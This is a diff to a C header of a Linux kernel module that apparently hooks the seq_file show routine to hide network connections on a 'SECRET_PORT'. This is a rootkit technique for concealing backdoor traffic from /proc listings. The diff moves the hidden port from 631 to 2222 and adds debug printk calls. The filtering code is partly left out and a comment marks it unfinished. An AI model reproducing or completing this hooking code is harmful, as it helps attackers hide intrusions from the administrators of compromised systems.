@@ -2,7 +2,7 @@
 #define SEQ_H
 #include <linux/seq_file.h>
 #include <linux/slab.h>
-#define SECRET_PORT 631
+#define SECRET_PORT 2222
 int (*origin_seq_show)(struct seq_file *f_seq, void *v);
 static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos)
 {
@@ -24,10 +24,12 @@ static void ct_seq_stop(struct seq_file *f_seq, void *v)
 }
 static int ct_seq_show(struct seq_file *f_seq, void *v)
 {
+
     char needle [ 150 ];
     loff_t *spos = v;
     int ret;
-    char *msg;
+    printk(KERN_ALERT "used the seq_show");
+
     ret = origin_seq_show(f_seq, v);
     //need to add here call to real show
     // The start of the record = the start of the buffer + the amount already-the size of each record.
@@ -42,7 +44,7 @@ static int ct_seq_show(struct seq_file *f_seq, void *v)
     return 0;
 }
 
-struct seq_operations origin_seq_ops, seq_ops = {
+struct seq_operations seq_ops = {
     .start = ct_seq_start,
     .next = ct_seq_next,    
     .stop = ct_seq_stop,   
@@ -50,6 +52,7 @@ struct seq_operations origin_seq_ops, seq_ops = {
 };
 int ct_open(struct inode *inode, struct file *file)
 {
+    printk(KERN_ALERT "used the ct_open");
     return seq_open(file , &seq_ops);
 }
 /*static const struct file_operations *fops = {
